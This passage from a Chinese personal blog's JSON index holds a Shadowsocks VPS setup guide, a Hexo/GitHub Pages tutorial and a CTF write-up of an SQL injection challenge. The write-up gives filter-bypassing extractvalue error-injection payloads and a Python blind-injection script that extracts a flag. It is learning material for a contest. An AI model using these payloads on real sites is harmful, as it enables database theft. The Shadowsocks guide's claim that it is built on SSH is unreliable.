原理我的理解：shadowsocks是基于ssh的,ssh基于RSA的加密技术,所以GFW无法获取传输的加密数据进行分析过滤,但由于创建隧道和数据传输的过程中，ssh本身的特征是明显的,导致GFW通过分析连接的特征进行干扰,而shadowsocks将ssh创建的 Socks5 协议拆开成 server 端和 client 端，那么我们就可以在本地的机器上进行ssh连接,从而解决被GFW通过特征分析进行干扰的问题 感兴趣的小伙伴可以参考这篇文章:写给非专业人士看的 Shadowsocks 简介,写的很详细 准备一台vps主机,本人用的是Vultr,最低的每月2.5美元,点击此处可以注册vultr账号,网站支持支付宝,Paypal等支付,推荐Paypal,在国外支付十分方便,登陆vultr选节点和服务器,现在只有New York(NJ)的费用是最低的,速度也算良心,ping测试的速度在280ms左右,服务器推荐选centos7 服务器远程连接工具,xshell下载地址 安装shadowsocks服务端用xshell以root权限登陆我们的vps,vps默认账号密码在我们的vultr账号中心的服务器列表中会有显示 安装shadowsocks服务端,使用teddysun的一键安装脚本,简单的三条命令便可完成安装 wget --no-check-certificate -O shadowsocks.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh chmod +x shadowsocks.sh ./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log 输入以上三条命令后,会让你输入一些东西去配置,如ssserver的登陆密码,端口,加密方法等,登陆密码默认为teddysun.com,输入你自己设置的密码,端口默认为8989,回车默认即可,不出意外的话就安装成功了 启动:/etc/init.d/shadowsocks start 停止:/etc/init.d/shadowsocks stop 重启:/etc/init.d/shadowsocks restart 状态:/etc/init.d/shadowsocks status 卸载:./shadowsocks.sh uninstall 配置文件:我们如果想修改配置的话，可以打开配置文件/etc/shadowsocks.json进行配置 安装shadowsocks服务端windows版客户端 mac版客户端 安装完成后输入shadowsocks服务端的ip和默认端口(8989),输入我们设置的密码就完成了,接下来我们就可以科学上网去学习知识了 参考资料科学上网的终极姿势-在-vultr-vps-上搭建-shadowsocks vultr-vps主机快速安装shadowsocks（ss）教程 Shadowsocks Python版一键安装脚本 写给非专业人士看的 Shadowsocks 简介","categories":[{"name":"科学上网","slug":"科学上网","permalink":"http://yoursite.com/categories/科学上网/"}],"tags":[{"name":"shadowsocks","slug":"shadowsocks","permalink":"http://yoursite.com/tags/shadowsocks/"}]},{"title":"第三届上海市大学生网络安全大赛注入题writeup","slug":"Some Words","date":"2017-11-05T12:54:31.315Z","updated":"2018-06-04T15:13:22.753Z","comments":true,"path":"2017/11/05/Some Words/","link":"","permalink":"http://yoursite.com/2017/11/05/Some Words/","excerpt":"题目:Some Words事先不知道有这个比赛，同学在群里发的链接，正好是自己感兴趣的注入，抱着学习的心态借同学的号做了一下","text":"题目:Some Words事先不知道有这个比赛，同学在群里发的链接，正好是自己感兴趣的注入，抱着学习的心态借同学的号做了一下进入题目链接，很明显是道注入题，先fuzz了一下，大致过滤了部分关键字如下: &#39;,and,union,where,=,updatexml,rand,group_concat等 一看就是黑名单过滤，虽然过滤了很多关键字，但是很容易绕过，在这我说两种注入方法: 报错注入虽然过滤了updatexml,rand等报错注入关键字,但是没有过extractvalue,过滤了and,可以用or代替，过滤了=可以用like代替,所以可以构造payload: ?id=1 or extractvalue(1,concat(0x3a,database(),0x3a))--+, 用extractvalue函数的特性报错爆出当前数据库名为words，该报错原理是因为extractvalue函数的第二个参数必须为XPATH格式的，但是concat连接函数返回的是字符串，格式不符合，所以报错并显示出该字符串的内容，接下来构造payload: ?id=1 or extractvalue(1,concat(0x3a,(select table_name from information_schema.tables where table_schema like database() limit 0,1),0x3a))--+ 爆出words数据库下的第一个表名为f14g,用双引号代替单引号继续构造payload: ?id=1 or extractvalue(1,concat(0x3a,(select column_name from information_schema.columns where table_name like &quot;f14g&quot; limit 0,1),0x3a))--+ 爆出f14g表下存在一个名为f14g的列名,于是构造payload: ?id=1 or extractvalue(1,concat(0x3a,(select f14g from f14g),0x3a))--+ 发现这个payload是不完整的,显示的是前31个字节,我们查一下长度: ?id=1 or extractvalue(1,concat(0x3a,(select length(f14g) from f14g),0x3a))--+ 结果为42 构造 ?id=1 or extractvalue(1,concat(0x3a,(select substr(f14g,1,31) from f14g),0x3a))--+ ?id=1 or extractvalue(1,concat(0x3a,(select substr(f14g,32,42) from f14g),0x3a))--+ 读取完整f14g:flag{93303476-a738-441b-9800-90719f16eb85} 注:f14g是随机生成的，每一次做题f14g都不一样 bool盲注过滤了and,我们可以用or(或)或者是^(位异或)进行逻辑判断,贴出我用python写的盲注脚本,代码写得很烂,求大佬们不要喷: import requests def gettablelen(url): i=1 while 1: payload=url+&quot;?id=-1 or (select length(table_name) from information_schema.tables where table_schema like database() limit 0,1) like %d--+&quot;%(i) html=requests.get(url=payload).content if html.find(&quot;Hello Hacker!!&quot;)!=-1: print &quot;table length:%d&quot;%(i) break else: i=i+1 return i def gettable(url,len): table=&quot;&quot; for i in range(1,len+1): for j in range(255): payload=url+&quot;?id=-1 or ascii(substr((select table_name from information_schema.tables where table_schema like database() limit 0,1),%d,1)) like %d--+&quot;%(i,j) html=requests.get(url=payload).content if html.find(&quot;Hello Hacker!!&quot;)!=-1: print chr(j) table=table+chr(j) break return table def getcolumnlen(url,table): i=1 while 1: payload=url+&apos;?id=-1 or (select length(column_name) from information_schema.columns where table_name like &quot;%s&quot; limit 0,1) like %d--+&apos;%(table,i) html=requests.get(url=payload).content if html.find(&quot;Hello Hacker!!&quot;)!=-1: print &quot;column length:%d&quot;%(i) break else: i=i+1 return i def getcolumn(url,len,table): column=&quot;&quot; for i in range(1,len+1): for j in range(255): payload=url+&apos;?id=-1 or ascii(substr((select column_name from information_schema.columns where table_name like &quot;%s&quot; limit 0,1),%d,1)) like %d--+&apos;%(table,i,j) html=requests.get(url=payload).content if html.find(&quot;Hello Hacker!!&quot;)!=-1: print chr(j) column=column+chr(j) break return column def getflaglen(url,table,column): i=1 while 1: payload=url+&apos;?id=-1 or (select length(%s) from %s limit 0,1) like %d--+&apos;%(column,table,i) html=requests.get(url=payload).content if html.find(&quot;Hello Hacker!!&quot;)!=-1: print &quot;flag length:%d&quot;%(i) break else: i=i+1 return i def getflag(url,table,column,len): flag=&quot;&quot; for i in range(1,len+1): for j in range(255): payload=url+&apos;?id=-1 or ascii(substr((select %s from %s limit 0,1),%d,1)) like %d--+&apos;%(column,table,i,j) html=requests.get(url=payload).content if html.find(&quot;Hello Hacker!!&quot;)!=-1: print chr(j) flag=flag+chr(j) break return flag def main(): url=&quot;http://cdb627a8a4974a5f92615994c9e6199abda58b73f6364df1.game.ichunqiu.com/index.php&quot; tlen=gettablelen(url) table=gettable(url,tlen) print table clen=getcolumnlen(url,table) column=getcolumn(url,clen,table) print &quot;%s column is %s&quot;%(table,column) flen=getflaglen(url,table,column) print &quot;flag len:%d&quot;%(flen) flag=getflag(url,table,column,flen) print flag if __name__==&apos;__main__&apos;: main()","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"我的第一篇博客","slug":"github-hexo","date":"2017-11-03T11:52:06.000Z","updated":"2018-06-04T15:01:00.613Z","comments":true,"path":"2017/11/03/github-hexo/","link":"","permalink":"http://yoursite.com/2017/11/03/github-hexo/","excerpt":"github+hexo搭建博客总结简介这是我的第一篇博客，为了搭这个博客折腾了好久，本人会把每一步步骤都记录下来供各位需要的小伙伴们参考，因为自己也是折腾出来的，有什么错误的地方还请大佬们多指教~~.","text":"github+hexo搭建博客总结简介这是我的第一篇博客，为了搭这个博客折腾了好久，本人会把每一步步骤都记录下来供各位需要的小伙伴们参考，因为自己也是折腾出来的，有什么错误的地方还请大佬们多指教~~. 初衷作为一个研究信息安全的苦逼，一直想找个地方把自己所学的技术同各位小伙伴分享，同时也想找个地方沉淀一下，于是想到了搭一个属于自己的博客，对博客的要求是美观且逼格高，上网找了很多，最终选择了用github+hexo搭建一个属于自己的技术博客，github是一个开源仓库，用的久了一定会发现很多有意思的东西，提升自己的技术，如果各位有和我一样的想法，那么这篇文章或许能帮上你. 第一步：环境准备那么要想搭建这个高逼格的博客都需要些什么呢？ windows环境（本人在windows上搭建的） 安装git和nodejs 注册一个github账号,点击此处去官网注册 可选，如果有需要的话，可以买个域名，推荐狗爹（godaddy）,可以选择自己喜欢的域名，我这个域名一年100人民币稍多一点，自己连买了两年，第一年5元多一点 hexo，一个一个基于Node.js的静态博客程序，其编译上百篇文字只需要几秒。hexo生成的静态网页可以直接放到GitHub Pages，BAE，SAE等平台上. 最重要的是写文档，这篇文档就是用MarkdownPad2写的，强烈推荐，第一次用很好用，容易上手,有收费的一些扩展，但是可以免费用 第二步：部署自己的Github Pages项目 第一步中github注册成功后，我们登陆我们的账号，然后找到New repository，在Owner中我们会看到自己的用户名，我们在Repository name中填上你的github用户名.github.io，然后再最下面的Initialize this repository with a README打上对勾即可 接下来创建一对ssh密钥，在Git Bash中输入ssh-keygen -t rsa -C &quot;your_email@example.com（你的github注册邮箱地址）&quot;，默认回车即可，等到完成时，屏幕会显示如下信息 Your identification has been saved in /c/Users/you/.ssh/id_rsa. Your public key has been saved in /c/Users/you/.ssh/id_rsa.pub. The key fingerprint is: xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx your_email@example.com 我们便可以在在C:\\Users\\用户名.ssh\\文件夹下看到我们生成的密钥对 接下来将SSH key添加到Github账户，登陆github，找到Settings，点SSH and GPG keys，Add SSH key，将C:\\Users\\用户名.ssh下的 id_rsa.pub（公钥）内容复制到Key中，Title随便命名即可，完成后输入ssh -T git@github.com，然后有一串问题，我们输入yes就行，然后就会显示： Hi username! You&apos;ve successfully authenticated, but GitHub does not provide shell access. 现在你已经可以通过 SSH 链接到 GitHub 了，还有一些个人信息需要完善的，输入 git config --global user.name &quot;用户名&quot; git config --global user.email &quot;自己的邮箱&quot; SSH Key配置成功，本机已成功连接到github。 第三步：安装与配置 hexo的安装与配置：在git和nodejs都安装后(本人安装到了c盘)，cmd下输入命令git --version，node -v，如果都显示出了版本信息，那么就说明安装成功，鼠标右键我们便可以看到Git Bash Here,我们可以在任何目录下打开Git的终端，当然也可以在Git的终端下cd切换目录，windows不同盘符之间相互切换不同于linux，windows直接输入盘符就能切换，然后cd+空格+目录即可，接下来就是安装hexo，在这里我把hexo安装到了E盘，那么在E盘下新建名为hexo的目录（名字随意），然后进入目录鼠标右键-&gt;Git Bash Here,打开Git终端，输入以下命令npm install hexo-cli -g，npm install hexo --save ，执行完后你会发现hexo下多了个node_moudles目录，说明安装成功，在这里会出现一个问题，就是我们在cmd下可以运行hexo，但是在Git Bash下，运行就会错误，这时不要紧张，我们把E:\\hexo\\node_modules\\.bin（根据你们自己的安装位置）这个路径添加到环境变量即可，方法:右键我的电脑-&gt;属性-&gt;高级系统设置-&gt;高级-&gt;环境变量，然后在系统变量那一栏找到Path这个环境变量，点编辑，在结尾添加一个;,然后把刚刚的路径加到分号后即可，这时就能在cmd和Git Bash下运行hexo了 搭建博客：经过上一步的安装，我们便可以在自己的电脑上搭建博客了~，我们在自己想选择的盘新建一个目录，如My Blog，然后进入该目录后创建一个名为github用户名.github.io的目录（和第一步的必须一样），然后进入该目录，执行Git Bash进入Git终端，运行hexo init，这条命令初始化hexo，然后npm install这条命令可以自动帮我们安装需要的组件，然后我们便可以在本地体验hexo了，输入hexo g命令生成静态文件，输入hexo s启动服务，然后在本地浏览器输入http://localhost:4000/便能看到自己的博客 第四步:安装主题插件 第三步中我们看到的自己的博客主题是hexo自带的，hexo为我们提供了100多种主题供我们选择，各位小伙伴可以根据自己的喜好选择，进入Hexo的官网主题专栏，本人选择了简约的Next，黑白的简约风格，很好看，然后进入的你博客目录下，右键进入Git Bash，输入git clone https://github.com/iissnan/hexo-theme-next themes/next下载该主题，该主题的中文文档，可以按照自己的需求配置,配置完成后hexo clean，hexo g,hexo s,我们便可以看到新的主题了 第五步:将本地的Hexo文件更新到Github的库中 在终端中运行如下命令npm install --save hexo-deployer-git安装hexo-deployer-git插件,注意命令一定要顺序一定要输对，否则会出现hexo d后 ERROR Deployer not found: git的错误： 在 自己博客目录下的_config.yml 中修改参数，如下所示： deploy: type: git repo: https://github.com/your_name/your_name.github.io.git branch: master 在Hexo文件夹下执行：hexo g -d,执行完之后会让你输入github的账号和密码，输入完后就可以登录我们自己的部署在Github Pages服务器上的博客了。对应的地址是 username.github.io(我的是：Lawliet96.github.io).然后既可以看到和本地一样的效果 绑定独立域名 购买域名，在godaddy上选择自己的域名，我选的是lawlietweb.com，因为实在很喜欢死亡笔记的L，哈哈，然后登陆自己的godaddy账号，选择dns，会出现一个dns表，我们只需把A @这一行的ip改为192.30.252.153GitHub的空间地址即可，接着配置CNAME文件，在自己博客目录下的source目录下创建文件 CNAME （新建记事本文件命名CNAME，然后打开）内容为你的域名，例如我的域名是：lawlietweb.com,在Git Bash中输入hexo g -d，然后过一段时间访问我们自己的域名便可以看到自己的博客了 总结 这些步骤其实很简单，但是自己却折腾了8个多小时，因为自己按照网上的资料一步步做下来后发现出了很多错误，于是自己百度一一解决了，于是写下这篇文章给给位爱折腾的小伙伴参考，然大家少走点弯路，最后希望大家支持我的博客，感谢了 参考资料 如何搭建一个独立博客——简明Github Pages与Hexo教程 小白独立搭建博客–Github Pages和Hexo简明教程 知行合一 | 用 Hexo 搭建博客 GitHub配置域名（Godaddy） - 博客频道 - CSDN.NET hexo你的博客 【超简单】Windows下使用GitHub + Hexo搭建技术博客 Markdown——入门指南","categories":[{"name":"其他","slug":"其他","permalink":"http://yoursite.com/categories/其他/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://yoursite.com/tags/Hexo/"}]},{"title":"Hello World","slug":"hello-world","date":"2017-10-28T13:28:26.526Z","updated":"2017-10-28T13:28:26.526Z","comments":true,"path":"2017/10/28/hello-world/","link":"","permalink":"http://yoursite.com/2017/10/28/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}